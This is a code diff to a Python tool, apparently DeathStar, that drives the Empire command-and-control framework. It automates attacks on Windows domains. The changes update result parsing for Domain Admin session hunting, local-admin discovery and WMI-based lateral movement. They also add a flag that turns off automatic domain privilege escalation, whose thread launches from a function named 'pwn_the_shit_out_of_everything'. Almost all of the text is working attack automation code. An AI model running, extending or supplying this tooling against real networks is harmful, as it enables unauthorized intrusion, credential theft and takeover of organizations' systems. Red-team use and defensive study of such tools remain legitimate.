@@ -28,7 +28,7 @@ from termcolor import colored
 from argparse import RawTextHelpFormatter
 from time import sleep
 from requests import ConnectionError
-# from IPython import embed
+from IPython import embed
 
 # The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -92,7 +92,7 @@ def login(empire_username, empire_password):
             if debug: print_debug('Status Code: {} Response: {}'.format(r.status_code, r.text))
             sys.exit(1)
     except ConnectionError:
-        print_bad('Connection Error. Check Empire RESTful API') # Connection refused
+        print_bad('Connection Error. Check Empire RESTful API')  # Connection refused
         sys.exit(1)
 
 
@@ -148,10 +148,10 @@ def run_shell_command_with_results(agent_name, command):
     r = run_shell_command(agent_name, command)
     while True:
         for result in get_agent_results(agent_name)['results']:
-            #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
-            if result['taskID'] == r['taskID']:
-                if len(result['results'].split('\n')) > 1:
-                    return result['results']
+            for entry in result['AgentResults']:
+                if entry['taskID'] == r['taskID']:
+                    if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
+                    return entry['results']
         sleep(2)
 
 
@@ -176,10 +176,10 @@ def execute_module_with_results(module_name, agent_name, module_options=None):
     r = execute_module(module_name, agent_name, module_options)
     while True:
         for result in get_agent_results(agent_name)['results']:
-            #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
-            if result['taskID'] == r['taskID']:
-                if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
-                    return result['results']
+            for entry in result['AgentResults']:
+                if entry['taskID'] == r['taskID']:
+                    if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
+                    return entry['results']
         sleep(2)
 
 
@@ -211,7 +211,6 @@ def delete_all_agent_results():
 
 def get_domain_sid(agent_name):
     results = execute_module_with_results('powershell/management/get_domain_sid', agent_name)
-    results = results[19:].strip()
     print_good('Got domain SID: {}'.format(results), agent_name)
     return results
 
@@ -225,9 +224,6 @@ def get_group_member(agent_name, group_sid='', group_name='', recurse=True):
     results = results.strip().split('\r\n\r\n')[:-2]
     members = []
     for result in results:
-        if result.startswith('Job'):
-            continue
-
         user = None
         domain = None
         for entry in result.split('\r\n'):
@@ -271,9 +267,6 @@ def user_hunter(agent_name, group_name='"Domain Admins"', threads=20, no_ping=Fa
 
     admin_sessions = []
     for section in results:
-        if section.startswith('Job'):
-            continue
-
         session = {}
         for entry in section.split('\r\n'):
             if entry.startswith('UserDomain'):
@@ -287,7 +280,7 @@ def user_hunter(agent_name, group_name='"Domain Admins"', threads=20, no_ping=Fa
 
         if session: admin_sessions.append(session)
 
-    print_good('Found {} active admin sessions: {}'.format(len(admin_sessions), [session['hostname'] for session in admin_sessions]), agent_name)
+    print_good('Found {} active admin sessions: {}'.format(len(admin_sessions), [session['sessionfrom'] for session in admin_sessions]), agent_name)
 
     return admin_sessions
 
@@ -298,10 +291,7 @@ def find_localadmin_access(agent_name, threads=20, no_ping=False, computer_name=
                       'NoPing': str(bool(no_ping))}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
-    if results.startswith('Job'):
-        results = results.strip()[19:].split('\r\n')
-    else:
-        results = results.strip().split('\r\n')
+    results = results.strip().split('\r\n')
 
     # Deletes the '\nFind-LocalAdminAccess completed!' string and a rogue '\n'
     results = results[:-2]
@@ -320,10 +310,7 @@ def find_localadmin_access(agent_name, threads=20, no_ping=False, computer_name=
 def get_gpo_computer(agent_name, GUID):
     module_options = {'GUID': GUID}
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_gpo_computer', agent_name, module_options)
-    if results.startswith('Job'):
-        results = results.strip()[19:].split('\r\n')
-    else:
-        results = results.strip().split('\r\n')
+    results = results.strip().split('\r\n')
 
     # Deletes the '\nGet-GPOComputer completed!' string and a rogue '\n'
     results = results[:-2]
@@ -391,11 +378,11 @@ def get_loggedon(agent_name, computer_name='localhost'):
     module_options = {'ComputerName': computer_name}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_loggedon', agent_name, module_options)
-    results = results.strip().split('\r\n')[4:-4]
+    results = results.strip().split('\r\n')[2:-4]
 
     loggedon_users = []
     for entry in results:
-        if not entry or entry.find('$') != -1:
+        if not entry or entry.find('$') != -1 or entry.startswith('-'):
             continue
         entry = re.sub(' +', ' ', entry.strip())
         username, domain, *_ = entry.split()
@@ -538,10 +525,9 @@ def spread(agent_name):
                 spread_usernames.append(agents[agent_name]['username'])
 
             print_info('Starting lateral movement', agent_name)
-            if priority_targets:
-                for box in [target for target in priority_targets]:
-                    if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
-                        invoke_wmi(agent_name, box)
+            for box in priority_targets:
+                if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
+                    invoke_wmi(agent_name, box)
 
             for box in find_localadmin_access(agent_name, no_ping=True, threads=args.threads):
                 # Do we have an agent on the box? if not pwn it
@@ -597,9 +583,10 @@ def pwn_the_shit_out_of_everything(agent_name):
     spread_threads[agent_name] = KThread(target=spread, args=(agent_name,))
     spread_threads[agent_name].start()
 
-    if not tried_domain_privesc and not privesc_threads:
-        privesc_threads[agent_name] = KThread(target=privesc, args=(agent_name,))
-        privesc_threads[agent_name].start()
+    if not args.no_domain_privesc:
+        if not tried_domain_privesc and not privesc_threads:
+            privesc_threads[agent_name] = KThread(target=privesc, args=(agent_name,))
+            privesc_threads[agent_name].start()
 
     if agents[agent_name]['high_integrity']:
         # tokens(agent_name)
@@ -745,6 +732,7 @@ if __name__ == '__main__':
     args.add_argument('-lp', '--listener-port', type=int, default=8443, metavar='PORT', help='Port to start the DeathStar listener on (default: 8443)')
     args.add_argument('-t', '--threads', type=int, default=20, help='Specifies the number of threads for modules to use (default: 20)')
     args.add_argument('--no-mimikatz', action='store_true', help='Do not use Mimikatz during lateral movement (default: False)')
+    args.add_argument('--no-domain-privesc', action='store_true', help='Do not use domain privilege escalation techniques (default: False)')
     args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
     args.add_argument('--debug', action='store_true', help='Enable debug output')
 
@@ -825,6 +813,6 @@ if __name__ == '__main__':
                 agent_threads[agent_name] = KThread(target=pwn_the_shit_out_of_everything, args=(agent_name,))
                 agent_threads[agent_name].start()
 
-        sleep(5)
+        sleep(1)
 
     sys.exit(0)
